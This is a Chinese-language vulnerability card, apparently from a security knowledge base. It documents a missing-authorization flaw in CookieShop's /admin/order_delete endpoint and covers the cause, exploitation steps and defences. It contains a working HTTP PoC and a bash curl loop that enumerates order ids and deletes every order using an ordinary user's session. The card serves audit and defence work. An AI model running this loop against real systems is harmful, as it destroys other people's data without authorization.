---
id: cookieshop-admin-order-delete-missing-authz
title: CookieShop 后台订单删除接口缺失鉴权：普通用户会话可直接删任意订单
type: scenario
domain: web
path: web/generic/auth
technique: broken-access-control
tags:
- auth
- authz
- idor
- java
- spring-boot
- shiro
- code-audit
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-08'
updated: '2026-11-08'
verification:
  verified_by: verifier-T1-18
  verified_at: '2026-11-08T12:17:34+08:00'
  notes: 已对照原文核对：img35 /admin/order_delete?id= 直接调 orderService.deleteCustOrder(id)、img39 CustOrderDao @Query delete from CustOrderBean c where c.id=:id、img43 普通用户会话 JSESSIONID、img44 以普通用户 Cookie 重放删除请求返回 302 redirect:/admin/order_list（未被 403 拦截），越权删除实证成立。dedup：spring-rbac-delete-user-idor、newbeemall-cart-delete-idor 均 related，删除对象与产品不同，非同链。未验证点：img44 未展示订单列表刷新后的删除结果，302 即视为接口放行；原文 img40/42 为空引用不影响本卡。
url: /docs/web/generic/auth/cookieshop-admin-order-delete-missing-authz/
draft: false
kb_aliases:
- CookieShop 越权删除订单
- order_delete 越权
- 后台接口未校验角色
---

## 一句话结论

CookieShop 的后台订单删除接口 `/admin/order_delete` 只校验“是否已登录”，不校验“是否为管理员”也不校验订单归属，普通注册用户拿着自己的 `JSESSIONID` 直接请求 `?id=<任意订单号>` 即可删除全站订单。

## 原理

该系统把权限控制交给 Shiro 的认证层，但只做了认证（`subject.login()` 成功即放行），没有对 `/admin/**` 路径配置角色授权（`filterChainDefinitionMap` 里没有 `roles[admin]`/`perms[...]`）。`AdminCustOrderController` 的删除方法只接收 `id` 并直接调用 service：

```java
@GetMapping("/admin/order_delete")
public String adminCustOrderDelete(@RequestParam(value = "id", required = true) Long id, Model model) {
    orderService.deleteCustOrder(id);
    return "redirect:/admin/order_list";
}
```

整条链路 `AdminCustOrderController → CustOrderServiceImpl.deleteCustOrder(id) → CustOrderDao.deleteCustOrder(id)` 中没有任何 `session.getAttribute("isAdmin")` 判断，也没有“该订单是否属于当前用户”的条件；DAO 的 JPQL 是 `delete from CustOrderBean c where c.id = :id`，以主键为唯一条件。

登录逻辑里其实已经算出了管理员标志（`LoginController` 依据 `roleNames.contains("admin")` 设置 `user.setIsAdmin(true/false)`），但这个标志从未在后台接口处被检查，属于“有数据、无校验”。

之所以能成功：HTTP 会话只证明身份（用户 A 已登录），不携带授权信息；服务端没有在每次请求时重新判定资源级权限，因此身份与权限之间的缝隙就是越权面。攻击者不需要伪造管理员会话，只要有一个合法普通账号。

## 触发条件

- 目标开放普通用户注册，且注册后的会话可用于访问 `/admin/*` 接口（登录态共享同一 `JSESSIONID` 机制）；
- 后台接口未在 Shiro 过滤器链或拦截器中配置角色/权限断言；
- 接口以自增/连续 `id` 作为唯一资源标识（可枚举）。

## 利用步骤

1. 注册或用已有普通账号登录，抓包取得 `JSESSIONID`；
2. 访问后台订单列表 `/admin/order_list`（若可直接打开说明后台仅做了登录校验），或直接构造删除请求；
3. 枚举 `id`（订单号通常连续，从 1 递增），对每个值发送删除请求；
4. 观察响应：`302 → /admin/order_list` 表示执行成功，返回 403/登录页表示有拦截；
5. 用管理员账号登录核对订单是否消失，确认越权生效。

## PoC

普通用户会话直接删除订单（无需管理员身份）：

```http
GET /admin/order_delete?id=74&pageNumber=1&listStatus=0 HTTP/1.1
Host: 192.168.204.151:8080
Cookie: JSESSIONID=<普通用户会话>
```

服务端处理后返回 `302 Location: /admin/order_list`，订单被物理删除。批量枚举：

```bash
for i in $(seq 1 200); do
  curl -s -o /dev/null -b "JSESSIONID=<普通用户会话>" \
    "http://target:8080/admin/order_delete?id=$i"
done
```

## 变体与关联

- 同类接口：后台的用户删除、商品删除、角色/许可管理（`/admin/*` 下同类 `*_delete`）若同样只做登录校验，均为等价越权点；
- 变体：把 `GET` 改为 POST 或加 `X-Requested-With` 头，可绕过仅按方法/路径匹配的粗糙规则；
- 水平越权：`/userController/findUserById`、`/custOrderController/*` 一类以 `id` 为参数的前台接口缺少归属校验时，可在同级用户间读取他人订单与资料；
- 关联：CSRF——删除接口为 GET 且无 token，管理员被诱导访问即可删除订单，与越权删除叠加放大危害；
- 关联：Shiro `rememberMe` 反序列化（本系统引用了 Shiro 但未对 `rememberMe` 入参，未构成利用链，仅记录为相邻风险）。

## 检测与防御

- 授权层：在 Shiro 过滤器链为 `/admin/**` 配置 `roles[admin]` 或细粒度 `perms[order:delete]`，并在 Controller 方法上加 `@RequiresRoles`/`@RequiresPermissions`；
- 资源级校验：删除前按当前用户校验订单归属（`where id = :id and user_id = :currentUser`），管理端也建议记录操作者；
- 接口设计：状态变更使用 POST/DELETE + CSRF token，避免 GET 触发写操作；
- 检测：用低权账号遍历 `/admin/*` 接口做 403 基线对比；日志中对“非管理员访问后台写接口成功”告警；对同一会话短时间内枚举连续 `id` 的行为告警。
